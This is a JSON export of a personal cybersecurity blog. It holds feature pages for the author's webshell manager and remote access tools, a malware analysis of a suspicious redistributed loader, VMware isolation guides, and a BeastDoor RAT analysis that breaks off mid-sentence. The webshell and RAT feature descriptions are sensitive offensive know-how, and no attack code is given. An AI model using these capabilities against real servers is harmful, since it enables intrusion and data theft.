{"meta":{"title":"ISSAC/iss4cf0ng's blog","subtitle":"CyberSecurity blog","description":"Everything is failing...","author":"ISSAC","url":"https://iss4cf0ng.github.io"},"pages":[{"title":"Alien","date":"2023-06-05T14:00:23.000Z","updated":"2026-02-07T04:01:26.374Z","comments":true,"path":"Alien/index.html","permalink":"https://iss4cf0ng.github.io/Alien/index.html","excerpt":"","text":"AlienAlien is a C#-based webshell management tool for penetration testing. This tool is currently being rewritten, as the previous four versions had architectural and design limitations due to my earlier experience level."},{"title":"Alien RegEdit","date":"2023-06-12T02:00:23.000Z","updated":"2023-06-12T03:16:38.046Z","comments":true,"path":"Alien/regedit.html","permalink":"https://iss4cf0ng.github.io/Alien/regedit.html","excerpt":"","text":"RegEdit跟Windows上的RegEdit差不多 Screenshot"},{"title":"Alien FileManager","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-12T17:53:11.881Z","comments":true,"path":"Alien/filemanager.html","permalink":"https://iss4cf0ng.github.io/Alien/filemanager.html","excerpt":"","text":"介紹主要的File Manager介面參考了Hatchet的UI，有以下功能 : FileManager Basic(基本的讀寫增刪、上傳、下載、WGET) 看圖片(這是以往的工具沒有的功能, 如果伺服器內有身份證之類的圖片就可以證明漏洞的問題) ShortCut : 上方的ToolStrip FastDir : 會掃瞄指定的dir，如果有那就加到TreeView，只要點一下就可以快速打開 Other : 顯示其他資料Search File掃描指定的檔案名，可自定掃瞄模式。Priviledge掃播指定Directory和SubDirectory，列出讀寫權限Logs把進行過的操作記下，可保存 看圖片功能某些情況下Folder內有上千張圖片，這種情況有可能是個人資料，可以使用該功能打開選中圖片，也可以一次打開當前dir下的所有Image檔。如果是前者那圖片會在不同分頁開啟，如果是後者那所有圖片都會在同一個分頁內雙撃分頁內任一張的圖片可以在新分頁打開。以分頁打開的圖片可以改SizeMode，有以下5種 : AutoSize : 自動調整大小 CenterImage : 把視角放在圖片的中心，不改變圖片大小 Normal : 顯示在左上角，但過大的圖片會被切掉 ScretchImage : 對圖片進行拉長或收縮至符合PictureBox的大小 Zoom : 對圖片進行拉長或收縮，但不改變圖片Width和Height的比例 由於可能會有很多圖片，所以可以設定Thread。 PS: 作者曾經沒有寫Thread功能，然後10張圖片直接卡死，而FastDir是把所有Directory都一次掃瞄，這是我目前測試後認為最好的做法，如果讀者有更好的方法歡迎提交issues。"},{"title":"Alien Database","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-12T03:07:36.240Z","comments":true,"path":"Alien/database.html","permalink":"https://iss4cf0ng.github.io/Alien/database.html","excerpt":"","text":"介紹Database的管理功能目前4.0只能讀不能寫，不過最近在寫最近的5.0打算加上寫的功能，還有一開始4.0寫得太趕了，BUG都沒有修好。 DB MySQL : php SQL Server : asp, aspx, asmx, ashx 功能Information Management SQL Shell PS : 圖片中的 Priviledge Exploit 那個還沒寫，4.0還沒有。"},{"title":"Alien System Information","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-12T03:40:32.518Z","comments":true,"path":"Alien/systeminfo.html","permalink":"https://iss4cf0ng.github.io/Alien/systeminfo.html","excerpt":"","text":"介紹介面參考了大灰狼遠控，可以獲得伺服器的資訊，有以下7個 :| ID | 主題 | 功能 ||——|——————|——————————-|| 1 | System | 伺服器基本資訊和HTTP資訊 || 2 | Process | 伺服器目前所有運行程式 || 3 | Service | 伺服器所有服務 || 4 | Connection | 列出所有連接IP || 5 | Window | 取得打開 WinForm的Title || 6 | User | 取得伺服器所有使用者和使用者資訊 || 7 | Port Scan | 端口掃瞄 | System Process Service Connection Window User Port Scan"},{"title":"Alien Monitor","date":"2023-06-12T14:00:23.000Z","updated":"2023-06-12T03:16:29.844Z","comments":true,"path":"Alien/monitor.html","permalink":"https://iss4cf0ng.github.io/Alien/monitor.html","excerpt":"","text":"介紹娛樂功能，實際在滲透測試中不見得會有用，只是證明了Webshell可以Screenshot的可行性。 Screenshot"},{"title":"BlackHat","date":"2023-06-06T09:14:25.000Z","updated":"2023-06-06T09:14:25.755Z","comments":true,"path":"BlackHat/index.html","permalink":"https://iss4cf0ng.github.io/BlackHat/index.html","excerpt":"","text":""},{"title":"Alien Virtual Terminal","date":"2023-06-05T14:00:23.000Z","updated":"2023-06-12T03:47:03.169Z","comments":true,"path":"Alien/terminal.html","permalink":"https://iss4cf0ng.github.io/Alien/terminal.html","excerpt":"","text":"介紹虛擬终端，這個應該沒甚麼好介紹。 注意這是虛擬终端，不是真的终端，不能進入Interactive Shell，也就是說如果你打ssh那會直接卡死。之後考慮再寫一個能Interactive Shell的功能(目前有大概想法)。 Screenshot"},{"title":"Notes","date":"2026-01-01T12:19:22.000Z","updated":"2026-02-21T12:33:14.170Z","comments":true,"path":"Notes/index.html","permalink":"https://iss4cf0ng.github.io/Notes/index.html","excerpt":"","text":"IntroductionThis page is a collection of links to all my personal notes on studying and reading. Each link leads to a separate note page that I maintain and continuously update as I learn more. Web Penetration Abstract Link Book Description WebSecurity From WhiteHat Principle and Practice of Web Penetration. Domain Penetration Abstract Link Book Description Domain Penetration - Windows Protocol DOmain Penetration Testing Practical Guide To Red-Blue Confrontation From ATT&amp;CK ATT&amp;CK Cyber Security. Privilege Escalation Technique Technique of Privilege Escalation. Intranet Penetration Practice Strategy Practical Privilege Escalation. Industrial SecurityBuffer OverflowDDoS Abstract Link SYN flooding SYN Flooding - From Principle to Practice Reverse EngineeringTools(Usage) Tool Description DuplexSpy A Remote Access Tool developed in C#, enabling complete control of a remote Windows machine, designed for legitimate remote administration and security testing of Windows systems. Eden-RAT A open-source Linux GUI-based Remote Access Tool developed in C# with a Python payload, intended for legitimate penetration testing and reconnaissance tasks. dotNetPELoader A C# PE loader for x64 and x86 PE files. Linux Book Description Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e This book introduces how to configure firewall on Linux. WindowsReverse Engineering Analyzing NetBus Book Description Reverse Engineering Core (리버스 엔지니어링 핵심 원리) This book introduces the knowledge of reverse engineering on Windows. Programming/DevelopmentNetwork Abstract Link Socket Init Socket Initialization Solution of Sticky Packet Solution of TCP packet sticking/coalescing (sticky packet) - Designing a protocol step by step C++ Book Description C++ 20 for Programmers - An Objects-Natural Appraoch A book of C++20 programming. C++ Concurrency In Action (Second Edition) C++ Concurrency Programming. C Abstract Link Thread with parameters Passing Parameters to Thread() Rust Book Description Rust Programming A book of Rust programming. Learning Go A book for learning Go-Lang. GoReal World Issues. How to Setup Your Experimental Environment for Malware Analysis Troubleshooting Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17 Series Inside Different Generations of RATs"},{"title":"EgoDrop","date":"2026-01-01T06:14:55.000Z","updated":"2026-01-01T06:14:55.944Z","comments":true,"path":"EgoDrop/index.html","permalink":"https://iss4cf0ng.github.io/EgoDrop/index.html","excerpt":"","text":""},{"title":"About","date":"2026-01-01T06:11:03.000Z","updated":"2026-02-21T12:22:49.659Z","comments":true,"path":"About/index.html","permalink":"https://iss4cf0ng.github.io/About/index.html","excerpt":"","text":"Hello world.Welcome to my blog!123456printf(&quot;Hello world.\\n&quot;);std::cout &lt;&lt; &quot;Hello world.&quot; &lt;&lt; std::endl;print(&#x27;Hello world.&#x27;)Console.WriteLine(&quot;Hello world.&quot;);System.out.println(&quot;Hello world.&quot;);fmt.Println(&quot;Hello world.&quot;) URL Github Gist Self-introduction My name is Issac, and I am interested in cybersecurity, networking, technology, and both human languages and programming languages. I speak Mandarin, Cantonese, and English, and I have a basic level of Spanish, Japanese, and Korean. I have been studying cybersecurity since middle school. I initially focused on web security, including web shells, databases, remote code execution, and web exploitation. Recently, I have been studying C2/RAT (Remote Access Tools) and exploits——not only how to use existing tools, but also how to write them. I believe these are essential parts of penetration testing, and it is necessary to understand their underlying principles. People often say that instead of trying to build tools from scratch, we should use tools developed by others. Of course, this approach is useful, as those tools are built by professionals. However, from my perspective, everyone who is capable of building professional tools also started somewhere. Idea of cybersecurity skillsI love coding and penetration testing and hacking skills, not because they are fun or make me look cool, but because they are powerful—almost like a superpower. However, power is often abused. Once people obtain power, they may be tempted to misuse it. That is why we must understand the meaning and responsibility behind power; otherwise, we are no different from animals——or criminals. About this blogTips Type is NOT Category: Type Description Code Provided code for related topic. Tool Provided or introduced the usage for the tool. Learning Describe a concept/Solving practical problem. Troubleshooting Solving practical issues. Note Keeping notes for a domain while studying. Book Keeping notes for a book while studying. Blackhat Write something about offensive/defensive skills Murmur Nonsense…? MurmurThere is no fixed update schedule, as my availability depends on my time, mood, and mental state. ⚠️ Personal thoughts — please read gently Unfortunately, I am currently struggling with mental issues and sometimes feel lost in an endless abyss, unable to find the right help even from professionals. I apologize if any of my words make you feel uncomfortable. I find some relief in reading, listening to music, coding, studying exploitation PoCs, and occasionally looking up at the night sky. These small things help me endure and stay grounded. There was a moment when a classmate once told me: > Don't write your own tools. Just use the ones written by others. Since then, one of my dreams has been to become one of those “others” — someone whose work can be used by others — while someday standing under the aurora, looking up at the night sky with stars. Thank you for taking the time to read these personal thoughts. I sincerely wish you all the best. Recently active repos DuplexSpy: A GUI-based Windows remote access tool written in C#. EgoDrop: An experimental GUI-based Linux/Windows remote access tool. Alien: A web shell management tool. I am planning to rewrite it, as the previous version was poorly designed. Skills and LearningFrameworks .NET JavaFx NuGet IDEs Arduino IDE Eclipse IntelliJ IDEA Vim Visual Studio Visual Studio Code OS Debian Ubuntu Fedora Kali Linux Windows 10 Windows 11 Windows XP LanguagesProgramming Languages C C# C++/Win32 APi C++ Python Perl PHP ASP ASP.NET Go-lang Rust PowerShell Java JavaScript Verilog RISC-V MASM NASM Matlab Human Languages Mandarine Cantonese English Spanish Japanese Korean Others Concurrency programming. Raspberry PI Lock picking. Cybersecurity Web Pentesting Domain Pentesting (AD/Cobalt Strike/Armitage/Metasploit) Network Programming Reverse Engineering (IDA/Ghidra) Shellcode Industrial security Interest Practical/Offensive Cybersecurity Remote Access Tool Exploitation Tool Development Cute Anime Girl Recently Reading/Recommanded Books Name Description C++20 for Programmers: An Objects-Natural Approach A book of C++ 20 programming. 域滲透攻防指南 A book of Windows domain(AD) pentesting. 逆向工程核心原理(이승원) This book introduces the principles and nutshells of reverse engineering, the original version is written in Korean. The TCP/IP Guide: A Comprehensive, Illustrated Internet Protocols Reference An excellent book for understanding the principle of TCP/IP. Windows 軟體安全實務 — 緩衝區溢位攻擊 It introduces the practical aspect of buffer overflow. 防火牆和VPN技術與實踐 This books introduces the principle and practical implementation of VPN and firewall. THANKS FOR YOU READING"},{"title":"Nonsense","date":"2023-06-11T17:12:23.000Z","updated":"2023-06-12T07:54:19.976Z","comments":true,"path":"Nonsense/index.html","permalink":"https://iss4cf0ng.github.io/Nonsense/index.html","excerpt":"","text":"介紹用來寫廢文，可能跟技術沒有甚麼關係的文章。"},{"title":"【Tool】SiteHunter","date":"2023-06-05T17:33:28.000Z","updated":"2023-06-11T13:00:52.866Z","comments":true,"path":"Tools/【Tool】SiteHunter.html","permalink":"https://iss4cf0ng.github.io/Tools/%E3%80%90Tool%E3%80%91SiteHunter.html","excerpt":"","text":""},{"title":"DuplexSpy","date":"2026-01-01T06:12:28.000Z","updated":"2026-01-01T06:12:29.409Z","comments":true,"path":"DuplexSpy/index.html","permalink":"https://iss4cf0ng.github.io/DuplexSpy/index.html","excerpt":"","text":""},{"title":"【Tool】Alien","date":"2023-06-05T17:33:04.000Z","updated":"2023-06-16T16:51:45.236Z","comments":true,"path":"Tools/【Tool】Alien.html","permalink":"https://iss4cf0ng.github.io/Tools/%E3%80%90Tool%E3%80%91Alien.html","excerpt":"","text":""},{"title":"Tools","date":"2023-06-05T14:00:39.000Z","updated":"2023-07-13T05:50:34.015Z","comments":true,"path":"Tools/index.html","permalink":"https://iss4cf0ng.github.io/Tools/index.html","excerpt":"","text":"Table ID Name Download 1 工具大全 https://github.com/malbuffer4pt/IssacTools 2 Alien https://github.com/malbuffer4pt/Alien 3 SiteHunter https://github.com/malbuffer4pt/SiteHunter 4 C段掃瞄(已停止更新) https://github.com/malbuffer4pt/DomainClassCIPScan 5 MagicalPunch https://github.com/malbuffer4pt/Magical-Punch 6 DBer https://github.com/malbuffer4pt/DBer 7 Tyrant https://github.com/malbuffer4pt/Tyrant IssacTools ID Name Description 1 BlackHat_SEO 學習黑帽SEO時寫的程式 2 BufferOverflow 學BufferOverflow時在書上看到的程式 3 Learning 自學程式時寫的 4 SQL Shell 從Alien的Payloads拿出來再改寫一下的程式 5 SQL 奇奇怪怪的SQL 6 TCP_Handler 用Python寫的TCP Handler"},{"title":"PenTest","date":"2023-06-12T07:50:56.000Z","updated":"2023-06-12T07:53:23.071Z","comments":true,"path":"PenTest/index.html","permalink":"https://iss4cf0ng.github.io/PenTest/index.html","excerpt":"","text":"介紹用來寫一些滲透測試相關的文章，寫了就會貼在這。"},{"title":"categories","date":"2023-06-05T13:59:43.000Z","updated":"2023-06-05T14:31:06.800Z","comments":true,"path":"categories/index.html","permalink":"https://iss4cf0ng.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2026-02-08T12:54:43.000Z","updated":"2026-02-08T12:54:43.249Z","comments":true,"path":"tags/index.html","permalink":"https://iss4cf0ng.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"[Reverse Engineering] How I Found a Suspicious Redistribution of My Project","slug":"2026-2-24-UnofficialRedistribution","date":"2026-02-24T08:30:40.000Z","updated":"2026-02-25T07:34:06.991Z","comments":true,"path":"2026/02/24/2026-2-24-UnofficialRedistribution/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/24/2026-2-24-UnofficialRedistribution/","excerpt":"","text":"BackgroundBy coincidence, I discovered a repository using the same name as my dotNetPELoader project, which caught my attention. I found that the source code in this repository is identical to mine, but it also includes an AI-generated README file. Given my recent experience studying malware analysis, I decided to perform reverse engineering on this suspicious executable. RepositoryFirst, the excessive use of emojis suggests this repository may have been AI-generated. Second, the README claims that the tool requires administrative rights to run, which is incorrect. I have demonstrated that dotNetPELoader works under user mode. Reverse EngineeringThe repository provides a direct ZIP download, bypassing the official Releases feature on GitHub. When performing reverse engineering, make sure to work in a virtual environment. (If you want to learn how to set up a safe experimental virtual environment for malware analysis, please click here and here). Open the executable jit.exe with ExeInfo: The content of App.cmd: The content of bcjit.ico: The Lua code is obfuscated. From my analysis, it appears that jit.exe loads the obfuscated code from bcjit.ico into memory and executes it. Do NOT run these files outside a controlled virtual environment. Next, I opened the jit.exe with Ghidra. The decompiled output confirms my hypothesis: It imports LUA51.DLL lua_cpcall() `lua_loadfile()` ConclusionThis is the first time I encounter this issue. Fortunately, I have been learning malware analysis recently. Regardless of the Lua script’s functionality—it might be as harmless as a “Hello world!”—it is still highly suspicious. Again, this suspicious executable file with Lua loader is NOT my work. THANKS FOR READING","categories":[{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/categories/Malware-Analysis/"}],"tags":[{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"Malware","slug":"Malware","permalink":"https://iss4cf0ng.github.io/tags/Malware/"},{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/tags/Malware-Analysis/"},{"name":"Ghidra","slug":"Ghidra","permalink":"https://iss4cf0ng.github.io/tags/Ghidra/"},{"name":"Lua","slug":"Lua","permalink":"https://iss4cf0ng.github.io/tags/Lua/"},{"name":"Unofficial Redistribution","slug":"Unofficial-Redistribution","permalink":"https://iss4cf0ng.github.io/tags/Unofficial-Redistribution/"},{"name":"Lua Loader","slug":"Lua-Loader","permalink":"https://iss4cf0ng.github.io/tags/Lua-Loader/"}],"keywords":[{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/categories/Malware-Analysis/"}]},{"title":"[Learning] How to Configure the Network of Your Virtual Machine using VMware Workstation","slug":"2026-2-22-ConfigureVirtualNetwork","date":"2026-02-22T04:15:57.000Z","updated":"2026-02-24T14:20:13.742Z","comments":true,"path":"2026/02/22/2026-2-22-ConfigureVirtualNetwork/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/22/2026-2-22-ConfigureVirtualNetwork/","excerpt":"","text":"IntroductionIn the previos article, I described how to setup a virtual environment for malware analysis. However, I did not fully explain the virtual network configuration. Therefore, I decided to write this article to help anyone facing the same issue. It also serves as a personal note on setting up an analysis environment efficiently. This article explains how virtual networks operate between virtual machines and introduces the configuration of different network adapters. CautionSometimes the network may still be misconfigured after you have tried all possible options. Based on my experience, reinstalling the virtual machine (possibly using a different, newest ISO image) can sometimes be a more effective solution. Network ConfigurationFundamental Network KnowledgeBefore configuring the network of your virtual machines. You should understand the following terms: DHCP: A network management protocol that automatically assigns IP addresses, subnet masks, default gateways, and DNS server details to devices on a network. Subnet mask: A 32-bit value (for IPv4 addresses) used to divide an IP address into network and host portions, defining which devices belong to the same local network. Default gateway: A nework node—typically a router—that acts as an access point or “exit door” for traffic leaving a local network to reach other networks or the internet. Network AdapterVMware Workstation 17 provides five different network adapter modes: Bridged: This mode allows a virtual machine to connect directly to the physical network. The virtual machine can communicate with other devices on the same local network. It can also access the internet if the host machine is connected to router or Wi-Fi access point. NAT: This mode allows virtual machines to share the host computer’s IP address to access external networks, such as the internet. Virtual machines can access the internet through the host’s connection. Host-only: This mode creates a private, isolated network within the host computer. Virtual machines can communicate only with the host and other VMs on the same host-only network. They cannot access the external internet. Custom: This mode enables advanced networking configurations by allowing VMs to connect to specific virtual networks configured in the Virtual Network Editor. It is ideal for complex multi-VM lab environments where traffic isolation is required. LAN segment: It creates a completely isolated virtual network that connects multiple virtual machines together without allowing communication with the host or the external network. Which Network Adapter should you use?In depends on your purpose: If you want your virtual machines to access other physical devices on the local network (LAN), use Bridged mode. If you only need internet access, use NAT mode. If you are conducting malware analysis and require strict network isolation, use LAN segment mode. Getting StartedBefore configuring your network adapter, make sure your virtual machines are properly installed. Configure Your Network AdapterNavigate to your virtual machine, right-click it, and select Settings: Now you can choose the desired network adapter mode: You can also add an additional network adapter for multi-network adapter: Remember to enable “Connected” and “Connect at power on”: Configuring the adapter as Bridged, NAT, or Host-only is straightforward. Next, I will explain how to configure Custom and LAN segment modes. CustomThe difference between Custom and the first three network connection is that Custom provides more advanced configuration options. To configure it, navigate to the VMware Workstation menu and select: Edit -&gt; Virtual Network Editor From there, you can customize the configuration as needed. For example, you can specify which physical network adapter the bridged network shoud use. You can also manually define the subnet IP and subnet mask for your virtual network. LAN segmentConfiguring a LAN segment is slightly more complex. First, create a new LAN segment using the Global LAN Segments wizard, then start your virtual machines. Since this mode does not provide a DHCP service, you must manually assign IP addresses to your machines. WindowsIf your virtual machine runs Windows, execute the following command to opent the Network Connections panel:1&gt; ncpa.cpl Right-click the network adapter and select “Properties”: Select “Internet Protocol Version 4 (TCP/IPv4)” and click the “Properties”: Manually configure the IPv4 address for your virtual machines: To test connectivity, run:1&gt; ping 192.168.85.2 If the destination host is unreachable, the firewall may be blocking ICMP requests: In this case, disable the Windows firewall temporarily for testing: If the virtual machines still cannot communicate with each other, verify that their subnet masks match. Machines will not be able to reach each other if the subnet mask values are different. (In this case, both use 255.255.255.0) Linux (Debian / Kali Linux)Manually assigning an IP address on Linux is different from Windows. First, identify your network interface name:1$ ip aIt should be something like ens33, ens160 or eth0: Edit interfaces file:1$ sudo nano /etc/network/interfaces Replace or add:1234auto eth0iface eth0 inet static address 192.168.100.30 netmask 255.255.255.0 Important: Replace eth0 with your actual interface Restart networking:1sudo systemctl restart networking Verify: Test connectivity: Linux (Ubuntu)Configuring Ubuntu is almost the same, but with the different configuration file:1sudo nano /etc/netplan/01-network-manager-all.yaml Replace contents with:12345678network: version: 2 renderer: NetworkManager ethernets: eth0: dhcp4: no addresses: - 192.168.85.5/24 Important: Replace ens33 with your interface THANKS FOR READING","categories":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/categories/Learning/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Network","slug":"Network","permalink":"https://iss4cf0ng.github.io/tags/Network/"},{"name":"Linux","slug":"Linux","permalink":"https://iss4cf0ng.github.io/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://iss4cf0ng.github.io/tags/Windows/"},{"name":"VMware","slug":"VMware","permalink":"https://iss4cf0ng.github.io/tags/VMware/"},{"name":"VMware WorkStation","slug":"VMware-WorkStation","permalink":"https://iss4cf0ng.github.io/tags/VMware-WorkStation/"},{"name":"Configuration","slug":"Configuration","permalink":"https://iss4cf0ng.github.io/tags/Configuration/"},{"name":"Setup","slug":"Setup","permalink":"https://iss4cf0ng.github.io/tags/Setup/"},{"name":"Network Configuration","slug":"Network-Configuration","permalink":"https://iss4cf0ng.github.io/tags/Network-Configuration/"},{"name":"Virtual Network","slug":"Virtual-Network","permalink":"https://iss4cf0ng.github.io/tags/Virtual-Network/"},{"name":"Virtual Network Configuration","slug":"Virtual-Network-Configuration","permalink":"https://iss4cf0ng.github.io/tags/Virtual-Network-Configuration/"},{"name":"Kali","slug":"Kali","permalink":"https://iss4cf0ng.github.io/tags/Kali/"},{"name":"Kali Linux","slug":"Kali-Linux","permalink":"https://iss4cf0ng.github.io/tags/Kali-Linux/"}],"keywords":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/categories/Learning/"}]},{"title":"[Troubleshooting] Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17","slug":"2026-2-21-WinXpVMWareTool","date":"2026-02-21T03:32:09.000Z","updated":"2026-02-22T03:43:42.833Z","comments":true,"path":"2026/02/21/2026-2-21-WinXpVMWareTool/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/21/2026-2-21-WinXpVMWareTool/","excerpt":"","text":"IntroductionThis article explains how to install VMware Tools on Windows XP and Windows 95 using WMware Workstation 17. The installation enables features such as drag-and-drop and copy-and-paste between the host and the virtual machine. BackgroundRecently, while learning malware analysis, I installed multiple legacy operating systems in VMware Workstation. I then realized that VMware Tools included in Workstation 17 does not support legacy operating systems such as Windows XP by default. After successfully completing the installation, I found that the official instructions were not very user-friendly. Therefore, I decided to write this article to help anyone facing the same issue. Getting StartedWindows XPPower on your virtual machine. From the toolbar in VMware Workstation, navigate to: VM -&gt; Install VMware Tools You should see the following error message: The first URL (an ISO file) provides VMware Tools for legacy Windows operating systems, while the second URL contains instructions—which may not be very user-friendly. Click the first URL to download the ISO file, and move it to an appropriate directory. Note that no need to power off your virtual machine. Open the virtual machine settings: Select “CD/DVD” and modify the ISO image file path to the ISO file you downloaded eariler: Start your virtual machine and open “My Computer”: If the ISO file is mounted successfully, you shoud see VMware Tools listed as a removable drive: Double-click “VMWare Tools” to launch the installer: Follow the installation wizard to complete the setup: After installation, restart your virtual machine: If the VMWare Tools has been installed successfully, you will be able to use features such as drag-and-drop and copy-and-paste between the host and the guest system. Windows 95Installing VMWare Tools on Windows 95 is almost following the same procedure, but the ISO file is different. Select “CD/DVD” and modify the ISO image file path to the ISO file you downloaded eariler: Start your virtual machine and open “My Computer”, If the ISO file is mounted successfully, you shoud see VMware Tools listed as a removable drive: Follow the installation wizard to complete the setup: After installation, restart your virtual machine. If the VMWare Tools has been installed successfully, you will be able to use features such as drag-and-drop and copy-and-paste between the host and the guest system: THANKS FOR READING","categories":[{"name":"Troubleshooting","slug":"Troubleshooting","permalink":"https://iss4cf0ng.github.io/categories/Troubleshooting/"}],"tags":[{"name":"Troubleshooting","slug":"Troubleshooting","permalink":"https://iss4cf0ng.github.io/tags/Troubleshooting/"},{"name":"VMware","slug":"VMware","permalink":"https://iss4cf0ng.github.io/tags/VMware/"},{"name":"VMware Tools","slug":"VMware-Tools","permalink":"https://iss4cf0ng.github.io/tags/VMware-Tools/"},{"name":"Windows XP","slug":"Windows-XP","permalink":"https://iss4cf0ng.github.io/tags/Windows-XP/"},{"name":"Windows 95","slug":"Windows-95","permalink":"https://iss4cf0ng.github.io/tags/Windows-95/"}],"keywords":[{"name":"Troubleshooting","slug":"Troubleshooting","permalink":"https://iss4cf0ng.github.io/categories/Troubleshooting/"}]},{"title":"[Learning] How to Setup Your Experimental Environment for Malware Analysis","slug":"2026-2-21-HowToSetupYourExpEnv","date":"2026-02-21T03:24:39.000Z","updated":"2026-02-23T02:51:07.452Z","comments":true,"path":"2026/02/21/2026-2-21-HowToSetupYourExpEnv/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/21/2026-2-21-HowToSetupYourExpEnv/","excerpt":"","text":"IntroductionRecently, I realized how important it is to set up an experimental environment quickly. A properly configured environment significantly reduces the time spent installing tools and preparing virtual machines for malware execution and analysis. Therefore, I decided to write this article to help anyone facing the same issue. It also serves as a personal note on setting up an analysis environment efficiently. This article explains how to set up your experimental environment for malware analysis. Getting StartedVirtual MachineTo analyze malware, you need at least one virtual machine. For modern malware, Windows 10 x64 is a suitable choice, as it can execute both x64 and x86 PE files. It can also run executables built with .NET Framework 4.8. However, if you want to study legacy malware such as Netbus, you may need to install Windows XP or even Windows 95(click here to learn how to install VMware Tools for Windows XP and Windows 95). If you plan to explore topics overlapping with reverse engineering—such as buffer overflows or firmware analysis——you may need additional environments. For example: Windows XP (to study exploits without modern protections such as ASLR and DEP) Kali Linux (for generating shellcode or conducting exploit development) Debian or Ubuntu (for firmware extraction and analysis) If you are interested in studying buffer overflows, you can click here to read my notes. SnapshotA VMware snapshot is a point-in-time image of a virtual machine that captures its exact state—including memory, disk data, and settings—at a specific moment. It acts as a quick “undo” button for testing. It allows users to revert to a previous, stable state, through they are not intended as long-term backups. Snapshots should be treated as temporary restore points rather than backup mechanisms. Isolation and Safety ConsiderationsWhen building a malware analysis environment, always ensure that the virtual machines are isolated from your host system and external networks.Snapshots should be used before executing any unknown sample. SetupShared Folder (If necessary)Navigate to “Shared Folders”, select “Read-only”: ToolsTools are important for handling a complicated malware. You should transfer all your tools for malware analysis into the virtual machine before taking a snapshot: SnapshotA VMware snapshot is a point-in-time image of a virtual machine that captures its exact state—including memory, disk data, and settings—at a specific moment. It acts as a quick “undo” button for testing. It allows users to revert to a previous stable state, though it is not intended to be used as a long-term backup solution. Snapshot → Snapshot Manager Next, click “Take Snapshot”: Now, you can create additional snapshots based on the clean base snapshot: You can also create multiple snapshots derived from the original snapshot for different network configurations or installed applications. Note that you should power off your virtual machine of the current state before you go back to the previous state. In this case, I created three snapshots with different network configurations. The Clean_Base_Isolated snapshot uses a dedicated virtual network and is reserved specifically for malware analysis. Therefore, VMware Tools are recommanded for transferring malware samples or analysis tools into the virtual machine. However, since some malware may manipulate the clipboard, you can alternatively use a shared folder configured in read-only mode during analysis. Revert to the Last SnapshotAfter analyzing malware, the virtual machine system may become unstable or compromised. In such cases, you can easily revert to the last clean snapshot and start your next analysis session: THANKS FOR READING","categories":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/categories/Learning/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Studying","slug":"Studying","permalink":"https://iss4cf0ng.github.io/tags/Studying/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/tags/Malware-Analysis/"},{"name":"Setup","slug":"Setup","permalink":"https://iss4cf0ng.github.io/tags/Setup/"},{"name":"Experiment","slug":"Experiment","permalink":"https://iss4cf0ng.github.io/tags/Experiment/"}],"keywords":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/categories/Learning/"}]},{"title":"[Studying] Analyzing BeastDoor","slug":"2026-2-20-Beast","date":"2026-02-20T08:14:41.000Z","updated":"2026-02-25T16:34:55.994Z","comments":true,"path":"2026/02/20/2026-2-20-Beast/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/20/2026-2-20-Beast/","excerpt":"","text":"IntroductionThis article is part of my series: Inside Different Generations of RATs. If you are interested in the full series, please click the link above. This article presents a reverse engineering analysis of BeastDoor(2002), focusing on its internal architecture and communication protocol design. BeastDoorBeast (a.k.a BeastDoor) is a Windows-based backdoor trojan horse. It is capable of infecting versions of Windows from 95 to XP. It was written in Delphi and released first y its author Tataye in 2002 1. Considering the time period, Beast is a powerful RAT since it provides multiple and advanced features. The earliest publicly available version on the internet is 1.8, while the final released version is 2.07. This article analyzes version 2.07 through reverse engineering. Since this tool primarily targets Windows XP, some feature may not function correctly on modern operation systems such as Windows 10 or Windows 11. Experimental Environmental SetupTo safely conduct malware analysis, the environment should be isolated using virtual machines. Under no circumstances should malware be executed on a personal or production system Tool Description PEView Static analysis tool for examining PE and COFF file structures (EXE, DLL, OBJ, LIB) ExeInfo Tool for identifying packers and analyzing PE metadata UPX Packing and unpacking tool for PE files AsDie PE unpacking and detection tool Wireshark Network protocol analyzer used to capture and inspect live or recorded traffic Ghidra Open-source software reverse engineering framework developed by the NSA Device IP Address Description Windows XP x86 (VM) 192.168.85.2 Victim machine used for executing both the controller and payload Windows 10 x64 (VM) 192.168.85.3 Analysis machine used for reverse engineering The two virtual machines where configured within an isolated internal network to prevent unintended external communication. If you want to know how to set up your experimental enviroment, please view: How to Setup Your Experimental Environment for Malware Analysis Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17 UsageLaunch Beast2.07.exe on the Windows XP machine: Beast2.07.exe is the attacker-side application. From a networking perspective, it can function as either a server or a client. It supports both direct connections and reverse connections. To establish a connection, a payload (stub) must first be generated. Here, the term “Server” may be confusing from a modern perspective. In early-generation RATs, the “server” executable referred to the payload deployed on the victim machine, while the “client” executable provided the graphical interface for attackers. As firewall technilogies evolved and network security became more complex, attackers gradually shifted from direct connections to reverse connections. In addition, the 